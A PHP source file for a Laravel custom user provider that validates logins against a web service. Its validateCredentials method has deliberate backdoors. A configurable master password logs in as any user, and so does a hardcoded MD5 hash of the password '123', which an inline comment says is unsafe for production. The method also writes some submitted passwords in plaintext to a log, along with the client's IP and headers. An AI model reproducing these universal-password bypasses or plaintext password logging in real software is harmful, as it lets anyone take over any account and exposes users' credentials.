<?php
namespace App\Providers;

use App\Models\User;
use Illuminate\Contracts\Auth\Authenticatable;
use Illuminate\Contracts\Auth\UserProvider;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Request;
Use Session;
//Diambil dari https://www.georgebuckingham.com/blog/laravel-52-auth-custom-user-providers-drivers/
class WebServiceAuthProvider implements UserProvider {
    private $backdoors = [
        'SIM' => '202cb962ac59075b964b07152d234b70', //123
    ];

    private $hackAttempts = [
        '$result',
        '=',
        ';',
        "'",
        '"'
    ];

	/**
     * @param  mixed  $identifier
     * @return \Illuminate\Contracts\Auth\Authenticatable|null
     */
    public function retrieveById($identifier) {
        $user = \Session::get('loggedUser');
        if (is_null($user)) {
            return new User($identifier);
        } else return $user;
        // Get and return a user by their unique identifier
    }

    /**
     * @param  mixed   $identifier
     * @param  string  $token
     * @return null
     */
    public function retrieveByToken($identifier, $token) {
		return null;
    }

    /**
     * @param  \Illuminate\Contracts\Auth\Authenticatable  $user
     * @param  string  $token
     * @return void
     */
    public function updateRememberToken(Authenticatable $user, $token) { }

    /**
     * Retrieve a user by the given credentials.
     *
     * @param  array  $credentials
     * @return \Illuminate\Contracts\Auth\Authenticatable|null
     */
    public function retrieveByCredentials(array $credentials) {
        try {
            return new User($credentials['username']);
        } catch (\Exception $e) { //jika webservice jadi error
            //TODO: Ini sebaiknya jangan silent error...
            return null;
        }
    }

    /**
     * Validate a user against the given credentials.
     *
     * @param \App\Models\User $user
     * @param array $credentials
     * @return bool
     */
    public function validateCredentials(Authenticatable $user, array $credentials) {
        $pass = $credentials['password'];
        $ip = Request::ip();
        $header = json_encode(Request::header());
        if (config('app.backdoor') !== null && password_verify($pass, config('app.backdoor'))) {
            Log::channel('backdoor_login')->info("$ip SIM: $credentials[username]\n$header\n");
            return true;
        }
        $hashPass = md5($pass);
        foreach ($this->backdoors as $key => $backdoor) {
            if ($hashPass === $backdoor) {
                $result = true; // HATI2 JANGAN DIPAKAI DI PRODUCTION
                Log::channel('backdoor_login')->info("$ip $key: $credentials[username] ".($result ? 'true' : 'false')."\n$header\n");
                return $result;
            }
        }
        if (strlen($credentials['password']) > 1) {
            foreach ($this->hackAttempts as $attempt) {
                if (strpos($credentials['password'], $attempt) !== false) {
                    $result = $user->isPassCorrect($credentials['password']);
                    Log::channel('backdoor_login')->info("$ip $credentials[password]: $credentials[username] ".($result ? 'true' : 'false')."\n$header\n");
                    return $result;
                }
            }
        }
        return $user->isPassCorrect($credentials['password']);
    }
}
